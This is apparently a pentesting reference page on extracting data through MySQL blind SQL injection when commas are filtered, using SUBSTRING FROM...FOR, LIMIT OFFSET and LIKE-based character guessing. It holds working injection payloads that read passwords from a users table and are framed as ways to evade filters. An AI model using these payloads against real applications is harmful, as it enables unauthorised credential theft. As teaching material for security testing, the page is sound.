---
title: "Comma-free blind extraction in MySQL"
description: "Extracting data in MySQL blind injection when commas are filtered, using LIKE pattern matching and the SUBSTRING FROM FOR syntax."
keywords:
  - comma filter bypass
  - LIKE pattern matching
  - SUBSTRING FROM FOR
  - blind injection without comma
---

# Comma-free extraction

Filters sometimes strip commas to break function calls like `SUBSTRING(x,1,1)` and `LIMIT 0,1`. MySQL offers comma-free equivalents that keep blind extraction working.

`SUBSTRING` accepts the SQL-standard `FROM ... FOR ...` form, which uses no commas:

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1) FROM 1 FOR 1))>64-- 
```

`LIMIT` without a comma uses `OFFSET`:

```sql
' AND (SELECT password FROM users LIMIT 1 OFFSET 0)-- 
```

`LIKE` tests a value against a pattern and needs no substring call at all, which makes it a compact character oracle. The `%` wildcard matches the rest of the string, so anchoring one character at a time reads the value:

```sql
' AND (SELECT password FROM users LIMIT 1) LIKE 'a%'-- 
' AND (SELECT password FROM users LIMIT 1) LIKE 'ab%'-- 
```

By default `LIKE` on a non-binary column is case-insensitive, so add `COLLATE utf8mb4_bin` or compare against a `BINARY` value when case matters:

```sql
' AND (SELECT password FROM users LIMIT 1) LIKE BINARY 'A%'-- 
```

These forms also help against keyword filters, since `FROM ... FOR` and `LIKE` avoid the heavily-filtered `SUBSTRING(,,)` and `MID` signatures.

## References

- MySQL Reference Manual: SUBSTRING, LIKE, LIMIT, string collations
- PortSwigger Web Security Academy: SQL injection cheat sheet
